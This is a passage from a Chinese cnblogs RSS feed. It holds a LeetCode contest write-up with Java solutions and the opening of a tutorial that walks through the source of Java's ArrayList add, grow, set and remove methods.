&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;                 sum +=&lt;span&gt; nums[j];
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;                list.add(sum);
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;给每一种子数组和排序&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt; &lt;span&gt;        Collections.sort(list);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;         &lt;span&gt;int&lt;/span&gt; res = 0&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;找到相对范围，因为下标是从0开始，但题目是从1开始，所以都要减1&lt;/span&gt;
&lt;span&gt;17&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = left - 1; i &amp;lt;= right - 1; i++&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;             res+=&lt;span&gt;list.get(i);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; (res &amp;gt;  1000000007&lt;span&gt; ) {
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;                 res -= 1000000007&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; res;
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1510116/202007/1510116-20200712073418737-404245042.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;div class=&quot;content__1Y2H&quot; readability=&quot;53&quot;&gt;
&lt;div class=&quot;notranslate&quot; readability=&quot;51&quot;&gt;
&lt;p&gt;给你一个数组 &lt;code&gt;nums&lt;/code&gt; ，每次操作你可以选择 &lt;code&gt;nums&lt;/code&gt; 中的任意一个数字并将它改成任意值。&lt;/p&gt;
&lt;p&gt;请你返回三次操作后， &lt;code&gt;nums&lt;/code&gt; 中最大值与最小值的差的最小值。&lt;/p&gt;

&lt;p&gt;示例 1：&lt;/p&gt;
&lt;pre&gt;
输入：nums = [5,3,2,4]
输出：0
解释：将数组 [5,3,2,4] 变成 [2,2,2,2].
最大值与最小值的差为 2-2 = 0 。
&lt;/pre&gt;
&lt;p&gt;示例 2：&lt;/p&gt;
&lt;pre&gt;
输入：nums = [1,5,0,10,14]
输出：1
解释：将数组 [1,5,0,10,14] 变成 [1,1,0,1,1] 。
最大值与最小值的差为 1-0 = 1 。
&lt;/pre&gt;
&lt;p&gt;示例 3：&lt;/p&gt;
&lt;pre&gt;
输入：nums = [6,6,0,1,1,4,6]
输出：2
&lt;/pre&gt;
&lt;p&gt;示例 4：&lt;/p&gt;
&lt;pre&gt;
输入：nums = [1,5,6,14,15]
输出：1
&lt;/pre&gt;

&lt;p&gt;提示：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;1 &amp;lt;= nums.length &amp;lt;= 10^5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-10^9 &amp;lt;= nums[i] &amp;lt;= 10^9&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Solution {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; minDifference(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;[] nums) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         &lt;span&gt;/*&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;            这里有一个问题就是，我只能改三次，如果改的话，肯定是把最大的改小了，或者把最小的改大了
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;            我们先排个序，改的三次不是在头就是在尾，我们用后四个分别减去前四个，
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;            求出最小的，那其他三个就是比较大的，改的时候改那三个就可以了
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;         
&lt;span&gt; 8&lt;/span&gt;         &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt;         
&lt;span&gt;10&lt;/span&gt; &lt;span&gt;        Arrays.sort(nums);
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         &lt;span&gt;int&lt;/span&gt; n =&lt;span&gt; nums.length;
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果不到四个元素，证明把其他三个全换成和另一个一样的就可以了，结果就为0了&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (n &amp;lt;= 4&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt; 0&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; Math.min(Math.min(nums[n - 1] - nums[3], nums[n - 2] - nums[2]), Math.min(nums[n - 3] - nums[1], nums[n - 4] - nums[0&lt;span&gt;]));
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;   
&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1510116/202007/1510116-20200712074003160-841017086.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;




&lt;div class=&quot;content__1Y2H&quot; readability=&quot;43&quot;&gt;
&lt;div class=&quot;notranslate&quot; readability=&quot;31&quot;&gt;
&lt;p&gt;Alice 和 Bob 两个人轮流玩一个游戏，Alice 先手。&lt;/p&gt;
&lt;p&gt;一开始，有 &lt;code&gt;n&lt;/code&gt; 个石子堆在一起。每个人轮流操作，正在操作的玩家可以从石子堆里拿走 任意 非零 平方数 个石子。&lt;/p&gt;
&lt;p&gt;如果石子堆里没有石子了，则无法操作的玩家输掉游戏。&lt;/p&gt;
&lt;p&gt;给你正整数 &lt;code&gt;n&lt;/code&gt; ，且已知两个人都采取最优策略。如果 Alice 会赢得比赛，那么返回 &lt;code&gt;True&lt;/code&gt; ，否则返回 &lt;code&gt;False&lt;/code&gt; 。&lt;/p&gt;

&lt;p&gt;示例 1：&lt;/p&gt;
&lt;pre&gt;
输入：n = 1
输出：true
解释：Alice 拿走 1 个石子并赢得胜利，因为 Bob 无法进行任何操作。
&lt;/pre&gt;
&lt;p&gt;示例 2：&lt;/p&gt;
&lt;pre&gt;
输入：n = 2
输出：false
解释：Alice 只能拿走 1 个石子，然后 Bob 拿走最后一个石子并赢得胜利（2 -&amp;gt; 1 -&amp;gt; 0）。
&lt;/pre&gt;
&lt;p&gt;示例 3：&lt;/p&gt;
&lt;pre&gt;
输入：n = 4
输出：true
解释：n 已经是一个平方数，Alice 可以一次全拿掉 4 个石子并赢得胜利（4 -&amp;gt; 0）。
&lt;/pre&gt;
&lt;p&gt;示例 4：&lt;/p&gt;
&lt;pre&gt;
输入：n = 7
输出：false
解释：当 Bob 采取最优策略时，Alice 无法赢得比赛。
如果 Alice 一开始拿走 4 个石子， Bob 会拿走 1 个石子，然后 Alice 只能拿走 1 个石子，Bob 拿走最后一个石子并赢得胜利（7 -&amp;gt; 3 -&amp;gt; 2 -&amp;gt; 1 -&amp;gt; 0）。
如果 Alice 一开始拿走 1 个石子， Bob 会拿走 4 个石子，然后 Alice 只能拿走 1 个石子，Bob 拿走最后一个石子并赢得胜利（7 -&amp;gt; 6 -&amp;gt; 2 -&amp;gt; 1 -&amp;gt; 0）。
&lt;/pre&gt;
&lt;p&gt;示例 5：&lt;/p&gt;
&lt;pre&gt;
输入：n = 17
输出：false
解释：如果 Bob 采取最优策略，Alice 无法赢得胜利。
&lt;/pre&gt;

&lt;p&gt;提示：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;1 &amp;lt;= n &amp;lt;= 10^5&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Solution {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;      &lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; winnerSquareGame(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; n) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;          &lt;span&gt;/*&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;            递推思路
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;                list保存一下可以取的石子的数量
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;                我们创建一个n+1的数组，循环每一个数量的石子数
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;                对于每一个石子数，只要当前石子数-可以取的石子数就证明可以取到这个数量
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;                并且数组当前石子数-可以取的石子数还要等于0，证明是没取过
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;                如果数组当前石子数-可以取的石子数等于1，说明我之前取过，
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;                如果我取过的话，我就不能再取了，我取过，该换bob取了
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;          
&lt;span&gt;12&lt;/span&gt;          &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt;         ArrayList&amp;lt;Integer&amp;gt; list = &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;&lt;span&gt;();
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 1; i * i &amp;lt;= n; i++&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;             &lt;span&gt;//&lt;/span&gt;&lt;span&gt;把可以取的数量都放进list&lt;/span&gt;
&lt;span&gt;16&lt;/span&gt;             list.add(i *&lt;span&gt; i);
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;         &lt;span&gt;int&lt;/span&gt;[] dp = &lt;span&gt;new&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;[n + 1&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 1; i &amp;lt;= n; i++&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;             &lt;span&gt;//&lt;/span&gt;&lt;span&gt;循环每一种可以取的石子数&lt;/span&gt;
&lt;span&gt;21&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt;&lt;span&gt; num : list) {
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;                 &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果上一次不是我取得，证明我可以取，我取完得dp为1，bob取完得dp为0&lt;/span&gt;
&lt;span&gt;23&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt; (num &amp;lt;= i &amp;amp;&amp;amp; dp[i - num] == 0&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;                     dp[i] = 1&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; dp[n] == 1&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1510116/202007/1510116-20200712074928594-1850620777.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;又不懂或者写的不恰当的地方欢迎大佬评论&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sat, 11 Jul 2020 23:51:00 +0000</pubDate>
<dc:creator>南墙1</dc:creator>
<og:description>这套题不算难，但是因为是昨天晚上太晚了，好久没有大晚上写过代码了，有点不适应，今天上午一看还是挺简单的 5177. 转变日期格式 给你一个字符串&amp;#160;date&amp;#160;，它的格式为&amp;#160;</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/a1439775520/p/13286935.html</dc:identifier>
</item>
<item>
<title>迎难而上ArrayList，源码分析走一波 - 沉默王二</title>
<link>http://www.cnblogs.com/qing-gee/p/13286907.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qing-gee/p/13286907.html</guid>
<description>&lt;blockquote readability=&quot;6.5413793103448&quot;&gt;
&lt;p&gt;先看再点赞，给自己一点思考的时间，思考过后请毫不犹豫微信搜索【&lt;strong&gt;沉默王二&lt;/strong&gt;】，关注这个长发飘飘却靠才华苟且的程序员。&lt;br/&gt;本文 &lt;strong&gt;GitHub&lt;/strong&gt; &lt;a href=&quot;https://github.com/qinggee/itwanger.github.io&quot;&gt;github.com/itwanger&lt;/a&gt; 已收录，里面还有技术大佬整理的面试题，以及二哥的系列文章。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关于 Java 基础、Java 面向对象编程、Java 字符串、Java 数组等方面的知识点已经可以告一段落了，小伙伴们可以在「沉默王二」公众号后台回复「&lt;strong&gt;小白&lt;/strong&gt;」获取第二版手册。觉得不错的话，请随手转发给身边的小伙伴，赠人玫瑰，手有余香哈。&lt;/p&gt;
&lt;p&gt;那么接下来，我开始肝 Java 集合方面的文章了，小伙伴们请默默为我鼓个掌，我能听得到，真的，别吝啬你的掌声，响起来。第一篇，必须得从 ArrayList 开始，毕竟 ArrayList 可以称得上是集合方面最常用的类了，估计没有之一。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/07/java-arraylist-01.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;ArrayList 实现了 List 接口，是基于数组实现的。小伙伴们都知道，数组的大小是固定的，创建的时候指定了大小，就不能再调整了，如果数组满了，就不能再添加任何元素了。ArrayList 是数组很好的替代方案，它提供了比数组更丰富的预定义方法（增删改查），并且大小是可以根据元素的多少进行自动调整的，非常灵活。&lt;/p&gt;
&lt;p&gt;准备在 ArrayList 的第四个位置（下标为 3）上添加一个元素 55。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/07/java-arraylist-02.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;此时 ArrayList 中第五个位置以后的元素将会向后移动。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/07/java-arraylist-03.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;准备把 23 从 ArrayList 中移除。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/07/java-arraylist-03.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;此时下标为 7、8、9 的元素往前挪。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/07/java-arraylist-04.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;h3 id=&quot;h01arraylist&quot;&gt;&lt;span&gt;01、如何创建一个 ArrayList&lt;/span&gt;&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;ArrayList&amp;lt;String&amp;gt; alist = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;String&amp;gt;();&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以通过上面的语句来创建一个字符串类型的 ArrayList（通过尖括号来限定 ArrayList 中元素的类型，如果尝试添加其他类型的元素，将会产生编译错误），更简化的写法如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;List&amp;lt;String&amp;gt; alist = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于 ArrayList 实现了 List 接口，所以 alist 变量的类型可以是 List 类型；new 关键字声明后的尖括号中可以不再指定元素的类型，因为编译器可以通过前面尖括号中的类型进行智能推断。&lt;/p&gt;
&lt;p&gt;如果非常确定 ArrayList 中元素的个数，在创建的时候还可以指定初始大小。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;List&amp;lt;String&amp;gt; alist = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;(&lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样做的好处是，可以有效地避免在添加新的元素时进行不必要的扩容。但通常情况下，我们很难确定 ArrayList 中元素的个数，因此一般不指定初始大小。&lt;/p&gt;
&lt;h3 id=&quot;h02arraylist&quot;&gt;&lt;span&gt;02、向 ArrayList 中添加一个元素&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;可以通过 &lt;code&gt;add()&lt;/code&gt; 方法向 ArrayList 中添加一个元素，如果不指定下标的话，就默认添加在末尾。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;alist.add(&lt;span class=&quot;hljs-string&quot;&gt;&quot;沉默王二&quot;&lt;/span&gt;);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;感兴趣的小伙伴可以研究一下 &lt;code&gt;add()&lt;/code&gt; 方法的源码，它在添加元素的时候会执行 &lt;code&gt;grow()&lt;/code&gt; 方法进行扩容，这个是面试官特别喜欢考察的一个重点。&lt;/p&gt;
&lt;p&gt;下面是 &lt;code&gt;add(E e)&lt;/code&gt; 方法的源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(E e)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;modCount++;&lt;br/&gt;add(e, elementData, size);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;调用了私有的 &lt;code&gt;add(E e, Object[] elementData, int s)&lt;/code&gt; 方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(E e, Object[] elementData, &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; s)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (s == elementData.length)&lt;br/&gt;elementData = grow();&lt;br/&gt;elementData[s] = e;&lt;br/&gt;size = s + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后调用了非常关键的 &lt;code&gt;grow(int minCapacity)&lt;/code&gt; 方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Object[] grow(&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; minCapacity) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; oldCapacity = elementData.length;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (oldCapacity &amp;gt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; || elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; newCapacity = ArraysSupport.newLength(oldCapacity,&lt;br/&gt;minCapacity - oldCapacity, &lt;br/&gt;oldCapacity &amp;gt;&amp;gt; &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;           );&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; elementData = Arrays.copyOf(elementData, newCapacity);&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; elementData = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Object[Math.max(DEFAULT_CAPACITY, minCapacity)];&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果创建 ArrayList 的时候没有指定初始大小，那么 ArrayList 的初始大小就是 DEFAULT_CAPACITY：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; DEFAULT_CAPACITY = &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以容纳 10 个元素。&lt;/p&gt;
&lt;p&gt;还可以通过 &lt;code&gt;add(int index, E element)&lt;/code&gt; 方法把元素添加到指定的位置：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;alist.add(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;沉默王三&quot;&lt;/span&gt;);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;add(int index, E element)&lt;/code&gt; 方法的源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; index, E element)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;rangeCheckForAdd(index);&lt;br/&gt;modCount++;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; s;&lt;br/&gt;Object[] elementData;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; ((s = size) == (elementData = &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.elementData).length)&lt;br/&gt;elementData = grow();&lt;br/&gt;System.arraycopy(elementData, index,&lt;br/&gt;elementData, index + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,&lt;br/&gt;s - index);&lt;br/&gt;elementData[index] = element;&lt;br/&gt;size = s + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;该方法会调用到一个非常重要的本地方法 &lt;code&gt;System.arraycopy()&lt;/code&gt;，它会对数组进行复制（要插入位置上的元素往后复制，参照文章一开头提到的两张图片）。&lt;/p&gt;
&lt;h3 id=&quot;h03arraylist&quot;&gt;&lt;span&gt;03、更新 ArrayList 中的元素&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;可以使用 &lt;code&gt;set()&lt;/code&gt; 方法来更改 ArrayList 中的元素，需要提供下标和新元素。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;alist.set(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;沉默王四&quot;&lt;/span&gt;);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;原来 0 位置上的元素为“沉默王三”，现在将其更新为“沉默王四”。&lt;/p&gt;
&lt;p&gt;来看一下 &lt;code&gt;set()&lt;/code&gt; 方法的源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; E &lt;span class=&quot;hljs-title&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; index, E element)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;Objects.checkIndex(index, size);&lt;br/&gt;E oldValue = elementData(index);&lt;br/&gt;elementData[index] = element;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; oldValue;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;该方法会先对指定的下标进行检查，看是否越界，然后替换新值并返回旧值。&lt;/p&gt;
&lt;h3 id=&quot;h04arraylist&quot;&gt;&lt;span&gt;04、删除 ArrayList 中的元素&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;remove(int index)&lt;/code&gt; 方法用于删除指定下标位置上的元素，&lt;code&gt;remove(Object o)&lt;/code&gt; 方法用于删除指定值的元素。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;java language-java hljs&quot;&gt;alist.remove(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;br/&gt;alist.remove(&lt;span class=&quot;hljs-string&quot;&gt;&quot;沉默王四&quot;&lt;/span&gt;);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;先来看 &lt;code&gt;remove(int index)&lt;/code&gt; 方法的源码：&lt;/p&gt;
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;java language-java hljs&quot; readability=&quot;3&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; E &lt;span class=&quot;hljs-title&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; index)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;Objects.checkIndex(index, size);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; Object[] es = elementData;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@SuppressWarnings&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;unchecked&quot;&lt;/span&gt;) E oldValue = (E) es[index];&lt;br/&gt;fastRemove(es, index);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; oldValue;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
